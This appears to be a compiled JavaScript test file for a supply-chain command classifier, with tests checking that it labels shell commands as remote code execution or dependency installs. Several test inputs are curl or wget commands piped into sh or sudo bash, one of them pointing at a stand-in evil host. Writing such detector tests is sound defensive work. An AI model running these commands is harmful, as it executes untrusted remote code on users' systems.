...
describe("P2-25 classifySupplyChain", () => {
    it("flags remote code execution: curl | sh style pipes", () => {
        expect(classifySupplyChain("curl -s https://evil.example.com/x | sh")).toBe("remote_code_execution");
        expect(classifySupplyChain("curl -fsSL https://x/install.sh | bash")).toBe("remote_code_execution");
        expect(classifySupplyChain("wget -qO- https://x | sudo bash")).toBe("remote_code_execution");
    ...
    it("treats remote-exec as higher precedence than an install-looking segment", () => {
        ...
        expect(classifySupplyChain("curl https://x/install.sh | sh -s npm install")).toBe("remote_code_execution");
    });
    it("flags dependency install across package managers", () => {
        ...
        expect(classifySupplyChain("dotnet add package Newtonsoft.Json")).toBe("dependency_install");
...
//# sourceMappingURL=supply-chain.test.js.map